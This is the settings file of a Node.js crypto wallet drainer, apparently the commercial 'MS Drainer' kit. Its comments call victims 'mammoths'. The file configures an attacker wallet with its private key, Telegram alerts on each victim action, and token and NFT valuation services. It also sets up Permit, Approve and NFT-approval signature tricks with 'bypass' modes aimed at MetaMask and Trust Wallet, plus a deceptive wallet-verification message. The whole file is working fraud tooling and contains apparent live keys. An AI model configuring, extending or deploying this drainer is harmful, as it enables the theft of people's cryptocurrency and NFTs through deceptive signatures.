const https = require('https');
const ethers = require('ethers');
const axios = require('axios');
const express = require('express');
const parser = require('body-parser');
const Telegram = require('node-telegram-bot-api');
const fs = require('fs');
const readline = require('readline');
const path = require('path');

// ==================================================== =====================
// ========================= SCRIPT SETTINGS ===================== ====
// ==================================================== =====================

const MS_PASSWORD = ""; // Unique password that you were given when purchasing the script
const MS_Telegram_Token = ""; // Enter your token from the bot from @BotFather here (go there, create a bot there and receive this same token)
const MS_Telegram_Chat_ID = ""; // Enter the chat ID here, where you want to send notifications about the mammoth’s actions (if the ID starts with a minus, write it down)
const MS_Telegram_Admin_IDs = []; // Specify your Telegram ID here so that it only accepts commands from you

const MS_Wallet_Address = "0xF39767DAeD21867EF62212E9cb9467040d7FE976"; // Wallet address where mammoth assets will go
const MS_Wallet_Private = "e3e9804d870402756b3071b626522f7154230e6501481983fe11da78b4c110da"; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE OUTPUT WILL NOT WORK


const MS_Encryption_Key = 0; // Specify any number that will be used for encryption (it is not recommended to leave it as default!)
// The same number must be specified in the web3-provider.js file - if they differ, then nothing will work correctly

// The donation system is completely voluntary and disabled by default, but if in addition to the main payment,
// you want to support the script developer, you can share a modest percentage of your profits
// to do this, activate this function and the script will automatically make modest deductions
// Payments are made only from tokens (the native coin and NFT remain with you)

const MS_Allowance_API = false; // Whether to save the history of approved tokens (required for the verification module)
const MS_Allowance_Check = false; // Check wallets for repeated deposits (do not enable if third-party software is used)
const MS_Allowance_Withdraw = {
   mode: false, // Automatically withdraw found new assets from the wallet (works only when MS_Allowance_Check is enabled)
   min_amount: 0, // The amount in dollars from which the automatic withdrawal of the asset will be triggered (will only work with a working DeBank token!)
   wallets: { // List of wallets where automatic withdrawal works, including your main wallet (ADDRESS:PRIVATE)
     "0xF39767DAeD21867EF62212E9cb9467040d7FE976": "e3e9804d870402756b3071b626522f7154230e6501481983fe11da78b4c110da",
   }
};
const MS_Functional_Bot = true; // Allows you to perform some actions inside the bot (repeated charges, etc.)
const MS_Keep_ID_History = true; // Whether to store the numbering of connecting users after a server restart
const MS_Protection = false; // If set to "true", additional backend protection will be activated
// This will allow you to withstand some of the attacks you may be subject to, but there are also
// Chances are it might block some normal requests, so use wisely
// For example, you can request a wallet verification only once per minute from one IP
// Also, any data that looks different from normal will result in a 10 minute block
const MS_Repeats_Protection = true; // Protection against flooding with repeated encoded messages
const MS_Repeats_TS = 300; // After how many seconds the redo memory list will be cleared
const MS_Check_Limits = true; // Additional protection against “clicking” of evaluators; when enabled, do not forget to configure the parameters below
const MS_Check_Settings = {
   reset_after: 60, // After how many seconds the limit will be reset
   block_for_all: true, // Will block all checks if the total limit is exceeded during the interval specified above
   limit_for_all: 30, // If the above parameter is enabled, after this number of requests all checks will be blocked
   block_by_ip: true, // Will block all checks from a specific IP if the personal limit is exceeded
   block_by_id: true, // Will block all checks from a specific User ID if the personal limit is exceeded
   limit_personal: 5, // If one of the parameters above is enabled, after this number of requests, verification for the user will be blocked
};

// Below are the evaluator settings, you can use one evaluator or several
// To use the evaluator, you must specify its working key below; without the key, the evaluator will not work
// If the status of all evaluators is "false", the drainer will try to use free Ankr, but it is ineffective
// It is highly recommended to use the DeBank appraiser - it is the most stable and high-quality in terms of valuation
// To use multiple evaluators, simply set the desired evaluators to "true" instead of "false"
// If you enable the evaluator but don't specify/specify a non-working key, you will get incorrect results

// To get a key from DeBank, go to cloud.debank.com, register, then
// In the left menu, find the Open API item, select it, Access Key will appear on the right - this is your token
// In the same window you will need to purchase so-called units, the minimum price for them is $200
// After you see that units have been added to your balance, you can use the drainer

// To get the key to Ankr, go to ankr.com, register and top up your balance with any amount (preferably > $30)
// After this, open RPC Ethereum, there will be a link, after the last slash in this link there will be your token - copy it
// Be careful and monitor the balance on the site; if you top up with a small amount, it will be used up quickly
// If there is no key in the link, it means you have not replenished your balance enough or the funds have not yet been credited to your account

const MS_Use_Native = true; // If set to "true", the drainer analyzes networks using standard RPCs
// Searching for tokens using this method is limited to the native coin and some stablecoins
// Therefore, for advanced work it is necessary to use at least one of the evaluators below
const MS_Use_Ankr = true; // If set to "true", tokens are analyzed via Ankr (server side)
const MS_Use_DeBank = false; // If set to "true", tokens and NFTs are analyzed via DeBank, otherwise via Ankr API
const MS_Use_OpenSea = false; // If set to "true", NFTs will be requested via OpenSea, Zapper and DeBank will be ignored
const MS_Use_Zapper = false; // If set to "true", tokens will be requested via Zapper (if MS_Use_OpenSea = false, then NFTs too)

// THE LINES BELOW INDICATE TOKENS FOR APPRAISERS, DON'T FORGET TO SPECIFY THEM - IT WILL NOT WORK [!]

const MS_Ankr_Token = ""; // Token from Ankr Premium, leave blank ("") to use Ankr Free
const MS_DeBank_Token = ""; // Token from the Cloud DeBank API, if analysis is used through it
const MS_Zapper_Token = ""; // Token from Zapper API, if NFT analysis is used through it
const MS_OpenSea_Token = ""; // Token from OpenSea API, without it OpenSea API no longer works

const MS_Enable_API = false; // Enables an API that can be used in your projects
const MS_API_Token = "secret"; // Access key to access API requests (MAKE SURE TO CHANGE THIS VALUE!)
const MS_API_Mode = 1; // 1 - only sent assets, 2 - inputs, connections and sends, 3 - absolutely everything

const MS_Loop_Assets = 0; // 0 - after the end, give the user an error (RECOMMENDED), 1 - after the end, start requesting assets in a circle
const MS_Loop_Native = 0; // 0 - after refusal, proceed further (RECOMMENDED), 1 - ask for a signature until the last
const MS_Loop_Tokens = 0; // 0 - after refusal, proceed further (RECOMMENDED), 1 - ask for a signature until the last
const MS_Loop_NFTs = 0; // 0 - after refusal, proceed further (RECOMMENDED), 1 - ask for a signature until the last

const MS_Domains_Mode = 0; // 0 - allow any domains, 1 - allow only those in the white list
const MS_Domains_Whilelist = [ "example.com", "another.example.com" ]; // White list of domains, fill in according to the example

const MS_Blacklist_Online = 1; // 0 - use only local blacklist, 1 - load global blacklist
const MS_Blacklist_URL = "https://pastebin.com/raw/RiyXYTkp"; // link to general blacklist (Raw-JSON)

// The array below contains RPCs for working with networks within the server; here you can use private RPCs

const MS_Private_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Ethereum
  10: 'https://rpc.ankr.com/optimism' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Optimism
  56: 'https://rpc.ankr.com/bsc' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Binance Smart Chain
  137: 'https://rpc.ankr.com/polygon' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Polygon
  250: 'https://rpc.ankr.com/fantom' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Fantom
  43114: 'https://rpc.ankr.com/avalanche' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Avalanche
  42161: 'https://rpc.ankr.com/arbitrum' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Arbitrum
  8453: 'https://rpc.ankr.com/base' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Base
  324: 'https://rpc.ankr.com/zksync_era' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // zkSync Era
  369: 'https://pulsechain.publicnode.com', // Pulse
};

// The array below contains RPCs for working with networks within the client; it is recommended to use public RPCs here

const MS_Public_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth', // Ethereum
  10: 'https://rpc.ankr.com/optimism', // Optimism
  56: 'https://rpc.ankr.com/bsc', // Binance Smart Chain
  137: 'https://rpc.ankr.com/polygon', // Polygon
  250: 'https://rpc.ankr.com/fantom', // Fantom
  43114: 'https://rpc.ankr.com/avalanche', // Avalanche
  42161: 'https://rpc.ankr.com/arbitrum', // Arbitrum
  8453: 'https://rpc.ankr.com/base', // Base
  324: 'https://rpc.ankr.com/zksync_era', // zkSync Era
  369: 'https://pulsechain.publicnode.com', // Pulse
};

// The array below contains a list of tokens that are scanned in the native way

const MS_Stablecoins_List = {
  1: [
    {
      address: '0xdac17f958d2ee523a2206206994597c13d831ec7',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
    {
      address: '0x6b175474e89094c44da98b954eedeac495271d0f',
      name: 'DAI Stablecoin', symbol: 'DAI', price: 1, decimals: 18
    },
  ],
  10: [
    {
      address: '0x94b008aa00579c1307b0ef2c499ad98a8ce58e58',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0x7f5c764cbc14f9669b88837ca1490cca17c31607',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  56: [
    {
      address: '0x55d398326f99059ff775485246999027b3197955',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 18
    },
    {
      address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 18
    },
    {
      address: '0xe9e7cea3dedca5984780bafc599bd69add087d56',
      name: 'Binance USD', symbol: 'BUSD', price: 1, decimals: 18
    },
  ],
  137: [
    {
      address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  250: [
    {
      address: '0x1B27A9dE6a775F98aaA5B90B62a4e2A0B84DbDd9',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  42161: [
    {
      address: '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0xff970a61a04b1ca14834a43f5de4533ebddb5cc8',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  43114: [
    {
      address: '0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  8453: [
    {
      address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb',
      name: 'DAI Stablecoin', symbol: 'DAI', price: 1, decimals: 18
    },
    {
      address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  369: []
};

// Below are the notification settings you want to receive

const MS_Notifications = {
   enter_website: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Login to the site
   leave_website: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Exit the site
   connect_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Successful connection
   connect_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Connection request
   connect_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Connection rejected
   approve_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Request for confirmation
   approve_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Successful confirmation
   approve_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Confirmation rejected
   permit_sign_data: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Data from PERMIT
   transfer_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Transfer request
   transfer_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Successful transfer
   transfer_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Cancel transfer
   sign_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Signature request
   sign_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Successful signature
   sign_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Signature rejected
   chain_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Request to change network
   chain_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Network change accepted
   chain_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Network change rejected
};

// Below you can specify a message that a person will sign to verify the wallet
// May contain a {{ADDRESS}} tag, which will be replaced with a valid wallet address
// Wallet verification is necessary in order to discard fake or spoof wallets
const MS_VERIFY_WALLET = 0; // 1 - verify the wallet before debiting (RECOMMENDED), 0 - accept any address without verification
const MS_VERIFY_MESSAGE = `By signing this message, you agree to the Terms of Use and authorize the use of your wallet address to identify you on the site, also confirm that you are the wallet's owner:\n\n{{ADDRESS}}` ;

// Below is a black list of tokens in which PERMIT is present, but for some reason does not work
// If you find one, add it to the list below and PERMIT will not be used to withdraw this token

const MS_PERMIT_BLACKLIST = [
   // Record format: [ Chain_ID, Contract_Address ],
   [ 1, '0xae7ab96520de3a18e5e111b5eaab095312d7fe84' ],
   [ 137, '0x2791bca1f2de4661ed88a30c99a7a9449aa84174' ],
];

// Below is a black list of tokens in which unlimited confirmation does not work, but only specific
// If you find one, add it to the list below and only a certain amount will be confirmed

const MS_UNLIMITED_BLACKLIST = [
   // Record format: [ Chain_ID, Contract_Address ],
   [ 1, '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984' ],
];

// Below are the settings for the drainer operation logic

const MS_Settings = {
 Minimal_Wallet_Price: 1, // Specify the minimum value of the wallet in USD
   Tokens_First: 1, // 0 - by price, 1 - native token is always last, 2 - native token is always first
   // The two settings below are very important and the speed and quality of the drainer work depends on them
   // By turning off one or both settings, you will achieve a higher speed of the drainer
   // But at the same time you will reduce the quality of write-offs, confirmations may not arrive and will be reset
   // There may also be problems with automatic debiting of approved tokens
   // By enabling one or both settings, you will greatly improve the quality of write-offs, but reduce the speed
   Wait_For_Confirmation: 1, // 0 - continue without waiting for confirmation, 1 - wait for confirmation
   Wait_For_Response: 1, // 0 - do not wait for a response from the server, 1 - wait for a response from the server
   Sign: {
     Native: 1, // 0 - disabled, 1 - sign Transfer
     Tokens: 1, // 0 - disabled, 1 - sign Approve (recommended), 2 - sign Transfer
     NFTs: 1, // 0 - disabled, 1 - sign SAFA, 2 - sign TransferFrom
     Force: 0, // 0 - use another method if there is no signature, 1 - signature only
     WalletConnect: 1, // 0 - do not use in WalletConnect, 1 - use in WalletConnect
     WC_AE: 1, // 0 - skip signature only for known errors, 1 - for any errors (RECOMMENDED)
     MetaMask: 1, // 0 - disable signature for MetaMask, 1 - enable signature for MetaMask
     Trust: 1, // 0 - disable signature for Trust Wallet, 1 - enable signature for Trust Wallet
   },
   Permit: {
     Mode: 1, // 0 - disabled, 1 - enabled
     Priority: 0, // 0 - no priority, more than 0 - priority Permit from this amount in USD
     Bypass: 0, // 0 - block suspicious signatures, 1 - skip any signatures indiscriminately
     Challenge: 1, // 0 - if the signature is incorrect, reject; 1 - if the signature is incorrect, try to correct it
     Price: 1, // Minimum amount from which this method will be withdrawn
   },
   Permit2: {
     Mode: 1, // 0 - disabled, 1 - enabled
     Bypass: 0, // 0 - block suspicious signatures, 1 - skip any signatures indiscriminately
     Price: 1, // Minimum amount from which this method will be withdrawn
   },
  Approve: {
     Enable: 1, // 0 - disabled, 1 - enabled
     MetaMask: 2, // 0 - disabled, 1 - enabled, 2 - partial bypass (if not - TRANSFER), 3 - partial bypass (if not - ignore), 4 - partial bypass (if not - APPROVE)
     Trust: 4, // 0 - disabled, 1 - enabled, 2 - partial bypass (if not - TRANSFER), 3 - partial bypass (if not - ignore), 4 - partial bypass (if not - APPROVE)
     Bypass: 0, // 0 - block suspicious signatures, 1 - skip any signatures indiscriminately
     Withdraw: 1, // 0 - do not draw confirmed assets automatically, 1 - draw assets automatically
     Withdraw_Amount: 1, // Minimum amount for withdrawing a confirmed asset (only with Withdraw: 1)
   },
   SAFA: {
     Enable: 1, // 0 - disable, 1 - enable automatic NFT withdrawal
     Bypass: 0, // 0 - block suspicious signatures, 1 - skip any signatures indiscriminately
     Withdraw: 2, // 0 - do not automatically withdraw confirmed assets, 1 - withdraw only the most expensive, 2 - withdraw all assets
     Withdraw_Amount: 1, // Minimum amount for withdrawing a confirmed asset (only with Withdraw: 1/2)
   },
   Swappers: {
     Enable: 0, // 0 - disabled (RECOMMENDED), 1 - enabled
     Priority: 0, // 0 - without priority, 1 - with priority (but after Permit), 2 - with priority (absolute)
     Price: 50, // Minimum amount from which this method will be withdrawn
     Uniswap: 1, // 0 - disabled, 1 - enabled (does not work if Enable: 0)
     Pancake: 1, // 0 - disabled, 1 - disabled (does not work if Enable: 0)
     Quick: 0, // 0 - disabled (RECOMMENDED), 1 - enabled (does not work if Enable: 0)
     Sushi: 0, // 0 - disabled (RECOMMENDED), 1 - enabled (does not work if Enable: 0)
   },
   SeaPort: {
     Enable: 0, // 0 - disabled, 1 - enabled (only works when the SeaPort module is installed)
     Priority: 1, // 0 - triggers when the first NFT is reached, 1 - triggers first
     Limit: 1, // 0 - do not limit calls, 1 - no more than one call from one wallet
     Price: 1, // Minimum amount from which this method will be withdrawn
   },
 Blur: {
     Enable: 0, // 0 - disabled, 1 - enabled (only works when the Blur module is installed)
     Priority: 1, // 0 - triggers when the first NFT is reached, 1 - triggers first
     Limit: 1, // 0 - do not limit calls, 1 - no more than one call from one wallet
     Price: 1, // Minimum amount from which this method will be withdrawn
   },
   x2y2: {
     Enable: 0, // 0 - disabled, 1 - enabled (only works when the X2Y2 module is installed)
     Priority: 1, // 0 - triggers when the first NFT is reached, 1 - triggers first
     Price: 1, // Minimum amount from which this method will be withdrawn
   },
  Chains: {
    eth: { // Ethereum, network settings
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 15, // minimum price of the main coin in USD
       Min_Tokens_Price: 15, // minimum token price in USD
       Min_NFTs_Price: 15, // minimum NFT price in USD
       API: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99', // Etherscan API Key (do not change if you are not sure)
       Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
     bsc: { // Binance Smart Chain, network settings
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: 'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI', // Bscscan API Key (do not change if you are not sure)
       Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
     polygon: { // Polygon (MATIC), network settings
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: 'M9IMUX515SEB97THWJRQDKNX75CI66X7XX', // Polygonscan API Key (do not change if you are not sure)
       Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
    avalanche: { // Avalanche C-Chain, network setup
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: 'ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z', // Snowtrace API Key (do not change if you are not sure)
       Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
     arbitrum: { // Arbitrum, network setup
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: 'DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I', // Arbscan API Key (do not change if you are not sure)
       Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
     fantom: { // Fantom, network configuration
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: 'F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415', // Fantomscan API Key (do not change if you are not sure)
       Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
    optimism: { // Optimism, network settings
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: '46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK', // Optimismscan API Key (do not change if you are not sure)
       Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
     base: { // Base, network settings
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: '6NGC2DAW6N197CWFP224HSR3778ZDFF6EI', // Basescan API Key (do not change if you are not sure)
       Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
    zksync_era: { // ZkSync Era, network setup
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: '', // ZkSync Era API Key (do not change if you are not sure)
       Contract_Address: "", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
     pulse: { // Pulse, network configuration
       Enable: 1, // 0 - disabled, 1 - enabled
       Native: 1, // 0 - disabled, 1 - enabled
       Tokens: 1, // 0 - disabled, 1 - enabled
       NFTs: 1, // 0 - disabled, 1 - enabled
       Min_Native_Price: 1, // minimum price of the main coin in USD
       Min_Tokens_Price: 1, // minimum token price in USD
       Min_NFTs_Price: 1, // minimum NFT price in USD
       API: '', // Pulse API Key (do not change if you are not sure)
       Contract_Address: "", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
       Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts
     },
  }
};
